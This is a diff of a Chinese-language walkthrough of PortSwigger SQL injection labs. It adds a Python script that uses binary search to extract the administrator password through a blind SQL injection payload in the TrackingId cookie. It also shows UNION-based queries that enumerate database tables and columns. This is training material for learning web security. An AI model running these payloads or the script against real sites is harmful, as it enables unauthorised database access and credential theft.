@@ -383,7 +383,7 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
   ```sql
   ?category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
   ```
-  ![](./WriteUp-portswigger-SQL注入系列/LAB8-1-查询数据库中的所有表.png)
+  ![](LAB8-1-查询数据库中的所有表.png)
 - 发现一个名为`users_kdzjph`的表，猜测是目标表，尝试查询表中的列：
   ```sql
   ?category=Gifts' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'pg_user_mappings'--  
@@ -451,19 +451,81 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
   - SQL查询的结果不会返回，也不显示错误消息。但是如果查询有返回，应用程序会在页面中显示“Welcome back”消息。
   - 数据库包含一个名为`users`的表，其中包含`username`和`password`列。
   - 任务：利用SQL盲注漏洞，确定`administrator`用户的密码，以`administrator`的身份登录。
+
 - 解题过程
+
   - 首先，确定注入点：在cookie的`TrackingId`中注入`' AND '1'='1`和`' AND '1'='2`，发现返回的结果不一样，说明存在注入点
-    ![](./WriteUp-portswigger-SQL注入系列/LAB9-1-测试注入点.png)
-    ![](./WriteUp-portswigger-SQL注入系列/LAB9-2-测试注入点.png)
+    ![](LAB9-1-测试注入点.png)
+    ![](LAB9-2-测试注入点.png)
   - 拼接`TrackingId`，使用`AND`条件来判断密码的每一位
     ```
     ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm
     ```
-    ![](./WriteUp-portswigger-SQL注入系列/LAB9-3-测试密码第一位.png)
-    ![](./WriteUp-portswigger-SQL注入系列/LAB9-3-得到密码第一位.png)
+    ![](LAB9-3-测试密码第一位.png)
+    ![](LAB9-3-得到密码第一位.png)
   - 其他位同理，通过输入`a-zA-Z0-9`来判断密码的每一位
-  - 最终得到密码为`v13jnszie4……`，登录成功(应该有20位密码，需要熟练使用burpsuite或者编程实现，也可以使用sqlmap)
-  - 
+  - 手工注入费时费力，因此可以通过python编程实现，同时使用二分查找法，加快速度：
+    ```python
+    import requests
+
+
+    url = "https://0a4200f2037f22168015712d002c0009.web-security-academy.net/filter?category=Pets"
+    password=""
+
+    # cookies = {"TrackingId": "NEcgTt5umCL1PorI' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) < 'm; session=TAMJjOVBIkH0Dxb2XqzQwIFSZ0jWXvFa"}
+    TrackingId_1="NEcgTt5umCL1PorI' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "
+    # TrackingId_2
+    TrackingId_3=", 1) "
+    TrackingId_4="<"
+    TrackingId_5=" '"
+    # TrackingId_6
+    TrackingId_7="; session=TAMJjOVBIkH0Dxb2XqzQwIFSZ0jWXvFa"
+
+    position = 1
+
+    while True:
+        # 二分法查找
+        low = 32
+        high = 127
+        print("position: ",position)
+        while low < high:
+
+            mid = (low + high+1) // 2   # 将mid的计算方式调整为(low + high + 1) // 2，可以确保在最后一次循环中不会陷入死循环。
+            if chr(mid) == ";": # 由于cookie中不能直接使用分号，所以需要转义
+                cookies = {"TrackingId": TrackingId_1 + str(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + "\\"+chr(mid) + TrackingId_7}
+            else:
+                cookies = {"TrackingId": TrackingId_1 + str(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + chr(mid) + TrackingId_7}
+            response = requests.get(url, cookies=cookies)
+            if "Welcome back!" in response.text:
+                high = mid -1
+            else:
+                low = mid
+            print("position: ",position,"high: ", chr(high),str(high), "low: ", chr(low),str(low), "mid: ", chr((low + high+1) // 2),str((low + high+1) // 2))
+        if low == high:
+            print("x")
+            if chr(low) == ";":
+                cookies = {"TrackingId": TrackingId_1 + str(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + "\\"+chr(low) + TrackingId_7}
+            else:
+                cookies = {"TrackingId": TrackingId_1 + str(position) + TrackingId_3 + "=" + TrackingId_5 + chr(low) + TrackingId_7}
+            if "Welcome back!" in requests.get(url, cookies=cookies).text:
+                password += chr(low)
+                print(password)
+                position += 1
+            else:
+                break
+        else:
+            break
+    print(password)
+    ```
+  - 经测试，即时不熟悉编码，编码也比手工注入或者burpsuite intruder遍历快很多。在了解原理后，其实可以直接使用sqlmap进行注入，但是这里为了练习手工注入，所以使用python编程实现。
+  - 完成实验✅
+
+
+
+
+
+
+
 ## 参考资料
 
 - [PortSwigger之SQL注入实验室笔记 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/287481.html)
